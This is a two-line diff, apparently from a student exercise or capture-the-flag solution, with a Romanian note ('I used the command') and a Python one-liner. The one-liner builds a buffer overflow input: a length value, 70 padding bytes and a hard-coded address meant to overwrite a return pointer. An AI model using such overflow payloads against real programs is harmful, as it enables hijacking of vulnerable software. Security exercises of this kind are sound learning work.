@@ -1,0 +1,2 @@
+am folosit comanda 
+python3 -c 'print( "128\n" + "A"*70 + "\xd6\x91\x04\x08")' > input
